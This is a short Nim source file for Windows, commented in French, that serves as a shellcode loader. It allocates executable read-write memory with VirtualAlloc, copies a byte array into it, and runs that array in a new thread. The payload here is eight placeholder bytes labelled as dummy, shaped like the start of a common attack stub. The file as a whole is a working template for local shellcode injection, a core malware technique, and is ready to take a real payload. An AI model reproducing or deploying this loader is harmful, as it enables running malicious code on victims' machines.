import winim/lean
 
when defined(windows):
  echo "loader initialisé"
else:
  echo "Ce programme est prévu pour Windows uniquement"
 
echo "loader prêt"
 
var payload = [byte 0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00] # 8 bytes factices
 
echo "taille payload = ", payload.len
 
proc injectLocal[I, T](shellcode: var array[I, T]): void =
  let executable_memory = VirtualAlloc(
    nil,
    len(shellcode),
    MEM_COMMIT,
    PAGE_EXECUTE_READ_WRITE
  )
  copyMem(executable_memory, shellcode[0].addr, len(shellcode))
  let tHandle = CreateThread(
    nil,
    0,
    cast[LPTHREAD_START_ROUTINE](executable_memory),
    nil,
    0,
    cast[LPDWORD](0)
  )
  defer: CloseHandle(tHandle)
  discard WaitForSingleObject(tHandle, -1)
 
proc main =
  injectLocal(payload)
 
when isMainModule:
  main()